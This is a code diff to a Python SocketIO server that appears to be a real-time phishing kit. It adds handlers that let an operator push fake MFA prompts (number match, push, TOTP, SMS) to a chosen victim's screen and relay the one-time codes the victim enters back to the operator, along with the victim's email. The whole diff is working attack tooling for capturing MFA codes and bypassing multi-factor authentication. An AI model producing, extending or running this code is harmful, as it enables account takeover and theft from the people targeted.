@@ -394,6 +394,28 @@ def mark_compromised(data):
         print(f'[Operator] Marked compromised: {targets[sid].get("email", sid)}')
 
 
+@socketio.on('send_mfa_challenge', namespace='/operator')
+def send_mfa_challenge(data):
+    """Operator sends an MFA challenge to a specific target's screen."""
+    sid = data.get('sid', '')
+    mfa_type = data.get('type', '')  # number_match, push, totp, sms
+    payload = {
+        'type': mfa_type,
+        'number': data.get('number', ''),
+        'phone_hint': data.get('phone_hint', ''),
+    }
+    socketio.emit('mfa_challenge', payload, room=f'target_{sid}', namespace='/target')
+    print(f'[Operator] Sent MFA challenge ({mfa_type}) to {targets.get(sid, {}).get("email", sid)}')
+
+
+@socketio.on('clear_mfa_challenge', namespace='/operator')
+def clear_mfa_challenge(data):
+    """Operator clears the MFA challenge from a target's screen."""
+    sid = data.get('sid', '')
+    socketio.emit('mfa_clear', room=f'target_{sid}', namespace='/target')
+    print(f'[Operator] Cleared MFA challenge for {targets.get(sid, {}).get("email", sid)}')
+
+
 # ── WebSocket: Target ─────────────────────────────
 
 @socketio.on('connect', namespace='/target')
@@ -407,6 +429,23 @@ def target_register(data):
     sid = data.get('sid', '')
     if sid:
         join_room(f'target_{sid}')
+
+
+@socketio.on('mfa_code_response', namespace='/target')
+def mfa_code_response(data):
+    """Target submits a TOTP/SMS code — relay it to the operator panel."""
+    sid = data.get('sid', '')
+    code = data.get('code', '')
+    code_type = data.get('type', 'totp')
+    # Push to operator panel
+    socketio.emit('mfa_code_received', {
+        'sid': sid,
+        'code': code,
+        'type': code_type,
+        'email': targets.get(sid, {}).get('email', 'Unknown'),
+        'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
+    }, namespace='/operator')
+    print(f'[MFA Relay] Code received from {targets.get(sid, {}).get("email", sid)}: {code} ({code_type})')
 
 
 # ── Main ──────────────────────────────────────────
